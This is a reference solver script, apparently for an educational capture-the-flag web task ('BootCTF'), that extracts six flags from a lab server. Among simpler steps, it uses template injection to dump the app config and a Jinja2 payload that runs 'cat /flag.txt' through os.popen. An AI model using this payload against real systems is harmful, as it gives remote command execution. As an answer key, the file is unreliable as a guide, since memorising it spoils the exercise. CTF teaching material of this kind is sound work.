#!/usr/bin/env python3
"""Эталонное решение «Портала»: печатает все шесть флагов, по одному в строке.

Хост и порт берутся из окружения (TASK_HOST, TASK_PORT) — по умолчанию
127.0.0.1:8001. Так один и тот же скрипт работает и локально, и против стенда лектора:

    TASK_HOST=10.0.0.5 python3 solution/solve.py
"""

from __future__ import annotations

import base64
import os
import re
import urllib.error
import urllib.parse
import urllib.request

HOST = os.environ.get("TASK_HOST", "127.0.0.1")
PORT = os.environ.get("TASK_PORT", "8001")
BASE = f"http://{HOST}:{PORT}"


def get(path: str, data: bytes | None = None, headers: dict | None = None) -> tuple[int, str]:
    req = urllib.request.Request(BASE + path, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:  # noqa
        return exc.code, exc.read().decode("utf-8", "replace")


def flag1() -> str:
    _, html = get("/")
    token = re.search(r"note-01:\s*([A-Za-z0-9+/=]+)", html).group(1)
    return base64.b64decode(token).decode()


def flag2() -> str:
    _, js = get("/js/app.js")
    codes = [int(x) for x in re.search(r"note\s*=\s*\[([0-9,\s]+)\]", js).group(1).split(",")]
    return bytes(codes).decode()


def flag3() -> str:
    _, body = get("/api/secret", data=b"", headers={"X-Audit-Token": "lighthouse"})
    return re.search(r'"flag":\s*"([^"]+)"', body).group(1)


def flag4() -> str:
    _, body = get("/hello?name=" + urllib.parse.quote("{{config}}"))
    return re.search(r"(BootCTF\{[^}]+\})", body).group(1)


def flag5() -> str:
    req = urllib.request.Request(BASE + "/")
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.headers["X-Lighthouse-Note"]


def flag6() -> str:
    payload = "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
    _, body = get("/hello?name=" + urllib.parse.quote(payload))
    return re.search(r"(BootCTF\{[^}]+\})", body).group(1)


def main() -> None:
    for fn in (flag1, flag2, flag3, flag4, flag5, flag6):
        print(fn())


if __name__ == "__main__":
    main()
